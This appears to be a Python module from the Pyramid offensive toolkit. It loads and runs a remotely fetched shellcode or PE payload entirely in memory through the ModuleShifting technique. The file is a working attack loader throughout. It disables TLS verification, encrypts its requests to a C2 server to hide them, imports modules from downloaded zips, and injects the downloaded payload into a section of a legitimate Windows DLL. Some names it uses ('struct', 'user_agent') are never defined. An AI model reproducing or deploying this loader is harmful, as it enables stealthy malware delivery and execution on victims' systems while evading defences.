'''
Author: @naksyn (c) 2023

Description: Pyramid module for executing ModuleShifting in memory. This script allows in-memory loading of a remotely fetched PE or shellcode via ModuleShifting technique. 
No external code is required, i.e. you don't need to drop on disk external bindings anymore to accomplish this, all is done entirely in-memory.

Instructions: See README on https://github.com/naksyn/ModuleShifting

Copyright 2023
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
'''

import os
import base64
import ssl
import importlib
import zipfile
import urllib.request
import sys
import io
import time
import logging
import ctypes
import inspect

### This config is generated by Pyramid server upon startup and based on command line given
### AUTO-GENERATED PYRAMID CONFIG ### DELIMITER

pyramid_server='192.168.1.1'
pyramid_port='80'
pyramid_user='testuser'
pyramid_pass='testpass'
encryption='chacha20'
encryptionpass='superpass'
chacha20IV=b'12345678'
pyramid_http='http'
encode_encrypt_url='/login/'

### END DELIMITER


###### CHANGE THIS BLOCK ##########

### MODULESHIFTING CONFIG

use_pyramid_for_delivery=True
is_shellcode_payload=True  # True: shellcode - False: PE
FP_bytes=False # optional - if bytes are set requires using PE payload - set number of padding bytes to be added after the PE or shellcode to blend into False Positives (FPs)
execmethod='functionpointer'
payload_name = 'payload.bin'
hosting_dll_path="C:\\Windows\\System32\wmp.dll"
tgtsection=".rsrc"
URI_payload_delivery='http://192.168.1.1/payload.bin' # only needed if use_pyramid_for_delivery is false
dll_procedure='StartW' # Only necessary if payload is PE - dll procedure name to be called for dll execution

#### DO NOT CHANGE BELOW THIS LINE #####



### ChaCha encryption stub - reduced rounds for performance

def yield_chacha20_xor_stream(key, iv, position=0):
  """Generate the xor stream with the ChaCha20 cipher."""
  if not isinstance(position, int):
    raise TypeError
  if position & ~0xffffffff:
    raise ValueError('Position is not uint32.')
  if not isinstance(key, bytes):
    raise TypeError
  if not isinstance(iv, bytes):
    raise TypeError
  if len(key) != 32:
    raise ValueError
  if len(iv) != 8:
    raise ValueError

  def rotate(v, c):
    return ((v << c) & 0xffffffff) | v >> (32 - c)

  def quarter_round(x, a, b, c, d):
    x[a] = (x[a] + x[b]) & 0xffffffff
    x[d] = rotate(x[d] ^ x[a], 16)
    x[c] = (x[c] + x[d]) & 0xffffffff
    x[b] = rotate(x[b] ^ x[c], 12)
    x[a] = (x[a] + x[b]) & 0xffffffff
    x[d] = rotate(x[d] ^ x[a], 8)
    x[c] = (x[c] + x[d]) & 0xffffffff
    x[b] = rotate(x[b] ^ x[c], 7)

  ctx = [0] * 16
  ctx[:4] = (1634760805, 857760878, 2036477234, 1797285236)
  ctx[4 : 12] = struct.unpack('<8L', key)
  ctx[12] = ctx[13] = position
  ctx[14 : 16] = struct.unpack('<LL', iv)
  while 1:
    x = list(ctx)
    for i in range(3):
      quarter_round(x, 0, 4,  8, 12)
      quarter_round(x, 1, 5,  9, 13)
      quarter_round(x, 2, 6, 10, 14)
      quarter_round(x, 3, 7, 11, 15)
      quarter_round(x, 0, 5, 10, 15)
      quarter_round(x, 1, 6, 11, 12)
      quarter_round(x, 2, 7,  8, 13)
      quarter_round(x, 3, 4,  9, 14)
    for c in struct.pack('<16L', *(
        (x[i] + ctx[i]) & 0xffffffff for i in range(16))):
      yield c
    ctx[12] = (ctx[12] + 1) & 0xffffffff
    if ctx[12] == 0:
      ctx[13] = (ctx[13] + 1) & 0xffffffff


def encrypt_chacha20(data, key, iv=None, position=0):
  """Encrypt (or decrypt) with the ChaCha20 cipher."""
  if not isinstance(data, bytes):
    raise TypeError
  if iv is None:
    iv = b'\0' * 8
  if isinstance(key, bytes):
    if not key:
      raise ValueError('Key is empty.')
    if len(key) < 32:
      # TODO(pts): Do key derivation with PBKDF2 or something similar.
      key = (key * (32 // len(key) + 1))[:32]
    if len(key) > 32:
      raise ValueError('Key too long.')

  return bytes(a ^ b for a, b in
      zip(data, yield_chacha20_xor_stream(key, iv, position)))

### XOR encryption stub

def encrypt(data, key):
    xored_data = []
    i = 0
    for data_byte in data:
        if i < len(key):
            xored_byte = data_byte ^ key[i]
            xored_data.append(xored_byte)
            i += 1
        else:
            xored_byte = data_byte ^ key[0]
            xored_data.append(xored_byte)
            i = 1
    return bytes(xored_data)


### Encryption wrapper ####

def encrypt_wrapper(data, encryption):
    if encryption == 'xor':
        result=encrypt(data, encryptionpass.encode())
        return result
    elif encryption == 'chacha20':
        result=encrypt_chacha20(data, encryptionpass.encode(),chacha20IV)
        return result        

cwd = os.getcwd()


#### MODULE IMPORTER ####

moduleRepo = {}
_meta_cache = {}

# [0] = .py ext, is_package = False
# [1] = /__init__.py ext, is_package = True
_search_order = [('.py', False), ('/__init__.py', True)]


class ZipImportError(ImportError):
    """Exception raised by zipimporter objects."""

# _get_info() = takes the fullname, then subpackage name (if applicable),
# and searches for the respective module or package


class CFinder(object):
    """Import Hook"""
    def __init__(self, repoName):
        self.repoName = repoName
        self._source_cache = {}

    def _get_info(self, repoName, fullname):
        """Search for the respective package or module in the zipfile object"""
        parts = fullname.split('.')
        submodule = parts[-1]
        modulepath = '/'.join(parts)

        #check to see if that specific module exists

        for suffix, is_package in _search_order:
            relpath = modulepath + suffix
            try:
                moduleRepo[repoName].getinfo(relpath)
            except KeyError:
                pass
            else:
                return submodule, is_package, relpath

        #Error out if we can find the module/package
        msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
        raise ZipImportError(msg)

    def _get_source(self, repoName, fullname):
        """Get the source code for the requested module"""
        submodule, is_package, relpath = self._get_info(repoName, fullname)
        fullpath = '%s/%s' % (repoName, relpath)
        if relpath in self._source_cache:
            source = self._source_cache[relpath]
            return submodule, is_package, fullpath, source
        try:
            ### added .decode
            source =  moduleRepo[repoName].read(relpath).decode()
            #print(source)
            source = source.replace('\r\n', '\n')
            source = source.replace('\r', '\n')
            self._source_cache[relpath] = source
            return submodule, is_package, fullpath, source
        except:
            raise ZipImportError("Unable to obtain source for module %s" % (fullpath))

    def find_module(self, fullname, path=None):

        try:
            submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        except ImportError:
            return None
        else:
            return self

    def load_module(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
        code = compile(source, fullpath, 'exec')
        spec = importlib.util.spec_from_loader(fullname, loader=None)
        mod = sys.modules.setdefault(fullname, importlib.util.module_from_spec(spec))
        mod.__loader__ = self
        mod.__file__ = fullpath
        mod.__name__ = fullname
        if is_package:
            mod.__path__ = [os.path.dirname(mod.__file__)]
        exec(code,mod.__dict__)
        return mod

    def get_data(self, fullpath):

        prefix = os.path.join(self.repoName, '')
        if not fullpath.startswith(prefix):
            raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
        relpath = fullpath[len(prefix):]
        try:
            return moduleRepo[self.repoName].read(relpath)
        except KeyError:
            raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

    def is_package(self, fullname):
        """Return if the module is a package"""
        submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        return is_package

    def get_code(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
        return compile(source, fullpath, 'exec')

def install_hook(repoName):
    if repoName not in _meta_cache:
        finder = CFinder(repoName)
        _meta_cache[repoName] = finder
        sys.meta_path.append(finder)

def remove_hook(repoName):
    if repoName in _meta_cache:
        finder = _meta_cache.pop(repoName)
        sys.meta_path.remove(finder)

def hook_routine(fileName,zip_web):
    #print(zip_web)
    zf=zipfile.ZipFile(io.BytesIO(zip_web), 'r')
    #print(zf)
    moduleRepo[fileName]=zf
    install_hook(fileName)

### separator --- is used by Pyramid server to look into the specified dependency folder

zip_list = [
    'moduleshifting---moduleshifting'
]

for zip_name in zip_list:
    
    try:
        print("[*] Loading in memory module package: " + (zip_name.split('---')[-1] if '---' in zip_name else zip_name)  )
        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE
        request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
                  base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'), \
                  headers={'User-Agent': user_agent})
                  
        base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
        request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
        if '---' in zip_name:
            zip_name=zip_name.split('---')[-1]
        with urllib.request.urlopen(request, context=gcontext) as response:
            zip_web = response.read()
            print("[*] Decrypting received file") 
            zip_web= encrypt_wrapper(zip_web,encryption)
            hook_routine(zip_name, zip_web)

    except Exception as e:
        print(e)

print("[*] Modules imported")


##### PythonMemoryModule launcher #####

import moduleshifting

try:
    if (use_pyramid_for_delivery):
        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE
        print("[*] Downloading {} from URI {}".format(payload_name,pyramid_server))
        request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
                  base64.b64encode((encrypt_wrapper(('delivery_files---'+ payload_name).encode(), encryption))).decode('utf-8'), \
                  headers={'User-Agent': user_agent})
        base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
        request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
        with urllib.request.urlopen(request, context=gcontext) as response:
            buf = response.read()
            print("[*] Decrypting received file") 
            buf= encrypt_wrapper(buf,encryption)
    else: # Pyramid server is not used for dll delivery
        print("[*] Downloading {} from URI {}".format(payload_name,URI_payload_delivery))
        request = urllib.request.Request(URI_payload_delivery)
        result = urllib.request.urlopen(request)
        buf=result.read()
except Exception as e:
    print(e)
print("[*] Loading hosting dll " + hosting_dll_path)
hostingdll=ctypes.cdll.LoadLibrary(hosting_dll_path)
print("[*] Injecting payload " + payload_name)

dll = moduleshifting.ModuleShifting(hostingdll, data=buf, debug=True, FP_bytes=False, shellcode=is_shellcode_payload, tgtsection=tgtsection, execmethod=execmethod)

# this keeps python.exe opened while payload is executing
print("[*] Press Ctrl+C to end loop - Warning! this will end your routine and free the dll loaded.")
try:
    while True:
        pass
except KeyboardInterrupt:
    print("[!] Pressed Ctrl+C - exiting ")
    sys.exit()
    pass